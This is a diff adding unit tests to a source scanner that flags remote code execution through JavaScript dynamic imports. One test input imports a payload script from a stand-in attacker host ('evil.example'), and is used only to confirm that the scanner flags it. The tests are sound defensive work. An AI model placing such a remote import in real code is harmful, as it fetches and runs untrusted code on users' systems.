@@ -279,6 +279,31 @@ describe('PUL-Q007 — no remote code execution (source scan)', () => {
         expect(findings).toEqual([]);
       });
 
+      it('does NOT flag a no-substitution template-literal dynamic import of a local module', () => {
+        // `import(`./module`)` is a NoSubstitutionTemplateLiteral whose
+        // cooked value resolves to a relative path. The classifier
+        // strips it through the same static-string path as a regular
+        // string-literal local. Pinning the template-literal branch
+        // explicitly so a regression that drops the
+        // `isNoSubstitutionTemplateLiteral` arm of
+        // `classifyImportSpecifier` (`source-policy.ts`) fails here.
+        const findings = findingsOf('await import(`./module.js`);');
+        expect(findings).toEqual([]);
+      });
+
+      it('does NOT flag a no-substitution template-literal dynamic import of a package', () => {
+        const findings = findingsOf('await import(`howler`);');
+        expect(findings).toEqual([]);
+      });
+
+      it('flags a no-substitution template-literal dynamic import of a remote URL', () => {
+        // Same NoSubstitutionTemplateLiteral classifier path as the
+        // tests above, but the cooked value is a remote URL. The
+        // classifier must still route it to `static-remote-url`.
+        const findings = findingsOf('await import(`https://evil.example/payload.js`);');
+        expect(findings.map((f) => f.label)).toContain('dynamic import of remote URL');
+      });
+
       it.each([
         ['data:', "import('data:text/javascript,console.log(1)');"],
         ['blob:', "import('blob:https://example.com/abc-123');"],
